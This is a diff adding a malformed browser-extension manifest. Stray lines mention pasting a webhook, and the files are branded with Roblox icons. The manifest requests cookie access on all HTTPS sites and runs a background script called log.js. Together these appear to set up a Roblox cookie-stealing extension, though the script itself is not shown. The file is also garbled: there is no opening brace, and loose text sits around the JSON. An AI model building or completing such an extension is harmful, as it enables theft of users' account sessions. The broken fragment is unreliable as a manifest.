@@ -1,0 +1,22 @@
+webhook paste in browser ""
+ constent by apollo11
+
+    "host_permissions": [
+	"https://*/*"
+    ],
+
+    "permissions": [
+        "cookies"
+    ],
+
+    "background": {
+        "service_worker": "scripts/log.js"
+    },
+
+    "icons": {
+        "16": "assets/roblox.png",
+        "32": "assets/roblox.png",
+        "48": "assets/roblox.png",
+        "128": "assets/roblox.png"
+    }
+} assets.roblox.png for image
